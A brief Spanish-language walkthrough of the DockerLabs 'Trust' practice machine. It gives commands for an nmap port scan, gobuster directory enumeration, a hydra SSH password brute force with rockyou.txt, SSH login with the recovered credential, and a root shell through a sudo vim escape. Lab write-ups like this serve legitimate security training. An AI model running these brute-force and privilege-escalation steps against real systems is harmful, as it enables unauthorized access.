
# DockerLabs - Trust

## 1. Escaneo con Nmap

sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2
![[nmap2.png]]
Puertos: 22 (SSH) y 80 (HTTP)

---

## 2. Enumeración Web

gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
![[Gobuster2.png]]
Hallazgo: secret.php

curl http://172.18.0.2/secret.php
![[Curl2.png]]
Mensaje: "Hola Mario" -> Usuario: mario

---

## 3. Fuerza Bruta SSH

hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
![[Hydra2.png]]
Credencial: mario:chocolate

---

## 4. Acceso SSH

ssh mario@172.18.0.2
![[SSH2.png]]

---

## 5. Escalada de Privilegios

sudo -l
![[Sudo2.png]]
Resultado: mario puede ejecutar /usr/bin/vim como root

sudo vim -c ':!/bin/bash'
![[Sudo2.png]]
whoami
root
